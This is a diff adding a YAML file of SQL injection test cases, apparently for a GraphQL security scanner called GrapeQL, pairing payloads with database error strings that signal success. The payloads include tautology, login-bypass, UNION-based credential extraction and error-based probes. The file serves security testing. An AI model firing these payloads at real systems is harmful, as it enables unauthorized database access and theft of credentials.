@@ -1,0 +1,96 @@
+# GrapeQL SQL Injection Test Cases
+#
+# Each test case has:
+#   - name:       Human-readable label
+#   - payload:    The raw string injected into the argument
+#   - indicators: Strings to look for in the response that signal success
+
+test_cases:
+  # ── Basic SQL Injection ────────────────────────────────────────
+  - name: single_quote
+    payload: "'"
+    indicators: &sql_indicators
+      - "SQL syntax"
+      - "SQLite"
+      - "MySQL"
+      - "PostgreSQL"
+      - "ORA-"
+      - "SQL Server"
+      - "ORDER BY"
+      - "UNION"
+      - "HAVING"
+      - "LIMIT"
+      - "ERROR: syntax error at or near"
+      - "ERROR: unterminated quoted string at or near"
+      - "ERROR: unterminated quoted identifier at or near"
+      - "ERROR: column"
+      - "ERROR: operator does not exist"
+      - "ERROR: invalid input syntax for"
+      - "ERROR: relation"
+      - "ERROR: permission denied for"
+      - "ERROR: division by zero"
+      - "ERROR: PL/pgSQL"
+      - "ERROR: out of range"
+      - "ERROR: cannot insert into column"
+      - "SQLSTATE["
+      - "PG::Error:"
+
+  - name: or_1_eq_1_dash
+    payload: "' OR 1=1 --"
+    indicators: *sql_indicators
+
+  - name: or_string_eq
+    payload: "' OR '1'='1"
+    indicators: *sql_indicators
+
+  - name: double_quote_or
+    payload: '" OR ""="'
+    indicators: *sql_indicators
+
+  - name: double_quote_1_eq_1
+    payload: '" OR 1=1 --'
+    indicators: *sql_indicators
+
+  - name: or_1_eq_1_hash
+    payload: "' OR 1=1 #"
+    indicators: *sql_indicators
+
+  # ── Authentication Bypass ──────────────────────────────────────
+  - name: admin_comment_dash
+    payload: "admin' --"
+    indicators: *sql_indicators
+
+  - name: admin_comment_hash
+    payload: "admin' #"
+    indicators: *sql_indicators
+
+  - name: admin_comment_star
+    payload: "admin'/*"
+    indicators: *sql_indicators
+
+  # ── UNION-based ────────────────────────────────────────────────
+  - name: union_select_123
+    payload: "' UNION SELECT 1,2,3 --"
+    indicators: *sql_indicators
+
+  - name: union_select_users
+    payload: "' OR 1=1 UNION SELECT 1,username,password FROM users --"
+    indicators: *sql_indicators
+
+  # ── Error-based ────────────────────────────────────────────────
+  - name: error_based_version
+    payload: "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) --"
+    indicators: *sql_indicators
+
+  - name: error_based_extractvalue
+    payload: "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT DATABASE()), 0x7e)) --"
+    indicators: *sql_indicators
+
+  # ── Boolean-based ──────────────────────────────────────────────
+  - name: boolean_true
+    payload: "' AND 1=1 --"
+    indicators: *sql_indicators
+
+  - name: boolean_false
+    payload: "' AND 1=0 --"
+    indicators: *sql_indicators
